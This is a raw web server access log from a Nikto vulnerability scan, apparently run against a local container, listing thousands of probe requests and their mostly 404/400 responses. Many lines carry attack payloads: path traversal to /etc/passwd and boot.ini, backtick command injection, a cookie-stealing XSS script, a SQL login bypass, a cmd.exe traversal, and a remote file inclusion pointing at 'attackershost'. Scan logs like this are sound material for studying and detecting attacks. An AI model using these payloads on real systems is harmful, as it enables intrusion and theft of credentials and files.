172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /idealbb/error.asp?|-|0|404_Object_Not_Found HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002478)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /iisprotect/admin/SiteAdmin.ASP?|-|0|404_Object_Not_Found HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002479)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /imprimer.asp?no=%60/etc/passwd%60|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;`&#039;. HTTP/1.1" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /imprimer.asp?no=....//....//....//....//....//....//....//etc.passwd|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /imprimer.asp?no=../../../../../../../../../etc/passwd%00|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /imprimer.asp?no=/....../boot.ini|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /imprimer.asp?no=/.../.../.../.../.../.../boot.ini|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /imprimer.asp?no=/../../../../../../../../../../../../../../../../../../../../boot.ini|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /imprimer.asp?no=/../../../../../../../../etc/passwd|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /imprimer.asp?no=/.\\\"./.\\\"./.\\\"./.\\\"./.\\\"./boot.ini|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /imprimer.asp?no=/etc/passwd%00|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /imprimer.asp?no=/etc/passwd|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /imprimer.asp?no=c:\\boot.ini|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;c:&#039;. HTTP/1.1" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /include/customize.php HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002491)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /include/help.php HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002492)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /includes/footer.php3 HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002493)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /includes/header.php3 HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002494)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /index.php?topic=&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;%20 HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002500)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /infos/contact/index.asp HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002501)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /infos/faq/index.asp HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002502)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /infos/gen/index.asp HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002503)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /infos/services/index.asp HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002504)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /instaboard/index.cfm HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002505)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /intranet/browse.php HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002506)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /invitefriends.php3 HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002507)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /ipchat.php HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002508)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /ixmail_netattach.php HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002509)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /jsptest.jsp+ HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002510)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /kernel/class/delete.php HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002511)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /kernel/classes/ezrole.php HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002512)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /ldap.search.php3?ldap_serv=nonsense%20 HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002513)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /livredor/index.php HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002514)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /login.php3?reason=chpass2%20 HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002515)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /mail/include.html HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002516)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /mail/settings.html HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002517)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /mail/src/read_body.php HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002518)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /mailview.cgi?cmd=view&amp;fldrname=inbox&amp;select=1&amp;html=../../../../../../etc/passwd HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002519)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /mambo/banners.php HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002520)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /manage/login.asp+ HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002521)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /mantis/summary_graph_functions.php?g_jpgraph_path=http%3A%2F%2Fattackershost%2Flistings.txt%3F HTTP/1.1" 404 525 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002522)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /members/ID.pm HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002523)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /members/ID.xbb HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002524)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /mod.php HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002525)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /modif/delete.php HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002526)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /modif/ident.php HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002527)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /modif_infos.asp?n=%60/etc/passwd%60 HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002528)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /modif_infos.asp?n=....//....//....//....//....//....//....//etc.passwd HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002529)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /modif_infos.asp?n=../../../../../../../../../etc/passwd%00 HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002530)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /modif_infos.asp?n=/....../boot.ini HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002531)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /modif_infos.asp?n=/.../.../.../.../.../.../boot.ini HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002532)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /modif_infos.asp?n=/../../../../../../../../../../../../../../../../../../../../boot.ini HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002533)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /modif_infos.asp?n=/../../../../../../../../../etc/passwd HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002534)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /modif_infos.asp?n=/.\\\"./.\\\"./.\\\"./.\\\"./.\\\"./boot.ini HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002535)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /modif_infos.asp?n=/etc/passwd HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002536)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /modif_infos.asp?n=/etc/passwd%00 HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002537)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /modif_infos.asp?n=c:\\boot.ini HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002538)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /modules/Downloads/voteinclude.php+ HTTP/1.1" 404 525 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002539)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /modules/Forums/attachment.php HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002540)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /modules/Search/index.php HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002541)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /modules/WebChat/in.php+ HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002542)"
172.17.0.1 - - [12/Feb/2019:08:08:28 +0000] "GET /modules/WebChat/out.php HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002543)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /modules/WebChat/quit.php HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002544)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /modules/WebChat/users.php HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002545)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /modules/Your_Account/navbar.php+ HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002546)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /moregroupware/modules/webmail2/inc/ HTTP/1.1" 404 526 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002547)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /msadc/Samples/SELECTOR/showcode.asp?|-|0|404_Object_Not_Found HTTP/1.1" 404 526 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002548)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /myguestBk/add1.asp?|-|0|404_Object_Not_Found HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002549)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /myguestBk/admin/delEnt.asp?id=NEWSNUMBER|-|0|404_Object_Not_Found HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002550)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /myguestBk/admin/index.asp?|-|0|404_Object_Not_Found HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002551)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /netget?sid=Safety&amp;msg=2002&amp;file=Safety HTTP/1.1" 404 497 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002552)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /newtopic.php HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002553)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /nphp/nphpd.php HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002554)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /OpenTopic HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002555)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /options.inc.php+ HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002556)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /oscommerce/default.php HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002557)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /parse_xml.cgi HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002558)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /php/gaestebuch/admin/index.php HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002559)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /php/php4ts.dll HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002560)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /pks/lookup HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002561)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /pm/lib.inc.php HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002562)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /poppassd.php3+ HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002563)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /produccart/pdacmin/login.asp?|-|0|404_Object_Not_Found HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002564)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /productcart/database/EIPC.mdb HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002565)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /productcart/pc/Custva.asp?|-|0|404_Object_Not_Found HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002566)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /ProductCart/pc/msg.asp?|-|0|404_Object_Not_Found HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002567)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /product_info.php HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002568)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /prometheus-all/index.php HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002569)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /protected/ HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002571)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /protected/secret.html+ HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002572)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /protectedpage.php?uid=&#039;%20OR%20&#039;&#039;=&#039;&amp;pwd=&#039;%20OR%20&#039;&#039;=&#039; HTTP/1.1" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /protection.php HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002574)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /pt_config.inc HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002575)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /pvote/add.php?question=AmIgAy&amp;o1=yes&amp;o2=yeah&amp;o3=well..yeah&amp;o4=bad%20 HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002576)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /pvote/del.php?pollorder=1%20 HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002577)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /quikmail/nph-emumail.cgi?type=../%00 HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002578)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /room/save_item.php HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002579)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /rubrique.asp?no=%60/etc/passwd%60|55|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;`&#039;. HTTP/1.1" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /rubrique.asp?no=....//....//....//....//....//....//....//etc.passwd|55|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /rubrique.asp?no=../../../../../../../../../etc/passwd%00|55|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /rubrique.asp?no=/....../boot.ini|55|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /rubrique.asp?no=/.../.../.../.../.../.../boot.ini|55|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /rubrique.asp?no=/../../../../../../../../../../../../../../../../../../../../boot.ini|55|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /rubrique.asp?no=/../../../../../../etc/passwd|55|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /rubrique.asp?no=/../../../etc/passwd|55|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /rubrique.asp?no=/.\\\"./.\\\"./.\\\"./.\\\"./.\\\"./boot.ini|55|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /rubrique.asp?no=/etc/passwd%00|55|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /rubrique.asp?no=/etc/passwd|55|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /rubrique.asp?no=c:\\boot.ini|55|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;c:&#039;. HTTP/1.1" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /screen.php HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002592)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /scripts/tradecli.dll HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002593)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /scripts/tradecli.dll?template=nonexistfile?template=..\\..\\..\\..\\..\\winnt\\system32\\cmd.exe?/c+dir HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002594)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /security/web_access.html HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002595)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /sendphoto.php HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002596)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /servers/link.cgi HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002597)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /setpasswd.cgi HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002598)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /shop/php_files/site.config.php+ HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002599)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /shop/search.php HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002600)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /shop/show.php HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002601)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /shoutbox/expanded.php?conf=../../../../../../../etc/passwd%20 HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002602)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /Site/biztalkhttpreceive.dll HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002603)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /site_searcher.cgi HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002604)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /spelling.php3+ HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002605)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /squirrelmail/src/read_body.php HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002606)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /staticpages/index.php HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002607)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /status.php3 HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002608)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /supporter/index.php HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002609)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /supporter/tupdate.php HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002610)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /sw000.asp?|-|0|404_Object_Not_Found HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002611)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /syslog.htm?%20 HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002612)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /technote/print.cgi HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002613)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /texis/websearch/phine HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002614)"
